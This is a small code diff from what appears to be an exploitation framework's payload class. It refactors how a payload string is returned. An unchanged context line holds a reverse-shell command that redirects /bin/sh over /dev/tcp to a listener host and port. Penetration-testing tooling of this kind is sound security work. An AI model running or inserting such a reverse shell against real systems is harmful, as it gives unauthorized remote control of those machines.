@@ -80,5 +80,4 @@ class HatSploitPayload(Payload, TCPClient):
         else:
             payload = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1 &"
 
-        self.payload = payload
-        self.instructions = payload
+        return payload
